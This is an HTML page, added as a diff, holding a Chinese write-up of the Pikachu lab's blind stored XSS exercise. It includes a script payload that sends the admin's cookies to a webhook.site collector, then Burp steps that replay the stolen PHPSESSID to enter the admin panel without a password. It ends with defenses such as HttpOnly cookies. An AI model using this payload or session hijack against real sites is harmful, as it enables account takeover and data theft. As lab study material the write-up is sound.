@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Pikachu】Web-XSS-XSS之盲打 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Pikachu】Web-XSS-XSS之盲打 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.27 | <strong>分类：</strong>Pikachu | <strong>标签：</strong>Pikachu, Web, XSS, 盲打XSS, 会话劫持</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Pikachu 漏洞练习平台</li>
+        <li><strong>分类：</strong>Web - Cross-Site Scripting (XSS)</li>
+        <li><strong>题目名称：</strong>XSS之盲打</li>
+        <li><strong>环境：</strong>Burp Suite 社区版自带浏览器 + Webhook.site 接收平台。</li>
+        <li><strong>目标：</strong>向留言板提交恶意 Payload，模拟管理员访问后台触发，通过 Webhook 窃取管理员 Cookie，并利用窃取的 Cookie 实现免密登录后台。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>漏洞原理：</strong></p>
+    <p>盲打型 XSS 本质上属于存储型 XSS。区别在于：它的触发点在管理员后台，普通用户提交后无法直接看到回显，必须借助外带平台（如 webhook.site）或手动访问后台验证。</p>
+    
+    <div class="diff-box">
+        <strong>盲打 XSS 如何演变为“会话劫持”？</strong>
+        <ul>
+            <li><strong>埋雷：</strong>前台提交构造好的恶意 JS 代码（包含 Webhook 外带逻辑）。</li>
+            <li><strong>触发：</strong>管理员登录后台查看反馈，浏览器自动执行恶意代码。</li>
+            <li><strong>窃取：</strong>恶意代码利用 <code>&lt;img&gt;</code> 标签跨域请求，将管理员的 <code>PHPSESSID</code> 发送到 Webhook。</li>
+            <li><strong>劫持：</strong>攻击者拿到 Session ID 后，伪造请求头中的 Cookie，直接以管理员身份访问后台，无需密码。</li>
+        </ul>
+    </div>
+
+    <h2>3. 操作步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：准备外带接收平台</h3>
+        <p class="info-line">打开 <code>webhook.site</code>，获取专属的唯一 URL（例如：<code>https://webhook.site/44f4f857-1f6f...</code>），保持页面开启。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：提交盲打 Payload</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>&lt;script&gt;var img=new Image();img.src="https://webhook.site/44f4f857...?cookie="+document.cookie;&lt;/script&gt;</code></p>
+        </div>
+        <p class="info-line">在“看法”和“大名”输入框中均填入该 Payload，点击提交。页面提示“谢谢参与”。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：触发与验证（获取 Cookie）</h3>
+        <p class="info-line"><strong>触发：</strong>访问后台登录地址 <code>admin_login.php</code>，使用 <code>admin/123456</code> 登录，进入后台管理页 <code>admin.php</code>。</p>
+        <p class="info-line"><strong>现象一（弹窗证明）：</strong>页面加载时立刻弹出对话框 <code>1</code>，证明恶意代码在管理员浏览器中执行。</p>
+        <p class="info-line"><strong>现象二（外带证明）：</strong>切回 Webhook 页面，发现收到一条 GET 请求，<code>Query Strings</code> 成功获取到管理员的 Cookie：<code>ant[uname]=admin; ant[pw]=...; PHPSESSID=dhmjmeood177m4s2vut5u6lsei</code>。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>第四步：进阶利用——免密劫持后台（核心战果）</h3>
+        <p class="info-line">为了证明漏洞的实质危害，我在 Burp 中进行了会话劫持验证：</p>
+        <ul>
+            <li>拦截一个对 <code>admin_login.php</code> 的请求。</li>
+            <li>将请求方法修改为 <code>GET</code>，目标 URL 改为 <code>admin.php</code>。</li>
+            <li>删除请求头中的 <code>Content-Length</code> 和 <code>Content-Type</code>。</li>
+            <li>删除底部的请求体（<code>username=...</code>）。</li>
+            <li><strong>核心操作：</strong>将 <code>Cookie: PHPSESSID=...</code> 替换为 Webhook 窃取到的 <code>PHPSESSID=dhmjmeood177m4s2vut5u6lsei</code>。</li>
+            <li>放行请求，服务器返回状态码 200，页面直接渲染出“用户反馈的意见列表”，<strong>无需输入任何密码即成功进入后台</strong>。</li>
+        </ul>
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：提交后才打开 Webhook。</strong>盲打 XSS 是持久化的，触发时机在于“管理员访问后台”，而不是“提交留言”。只要数据存入了数据库，任何时候去后台触发都不晚。</li>
+        <li><strong>坑2：手工改包残留 <code>Content-Length</code>。</strong>将 POST 改为 GET 并清空请求体后，如果保留了 <code>Content-Length</code> 头，服务器会因等待数据而超时或报错。必须连同请求头一起删除，请求才能顺利发送。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>盲打 XSS 的真实杀伤力：</strong>不再局限于前端弹窗，而是直击管理员权限。通过窃取 Session，攻击者可以完全接管后台，实施数据篡改、删除或进一步渗透。</li>
+        <li><strong>防御建议：</strong>服务端对用户输入进行严格的过滤和转义；后台管理系统避免直接渲染用户提交的 HTML 内容；<strong>设置 Cookie 的 HttpOnly 属性</strong>（这一条最关键，能直接防止 JavaScript 读取 Cookie）。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
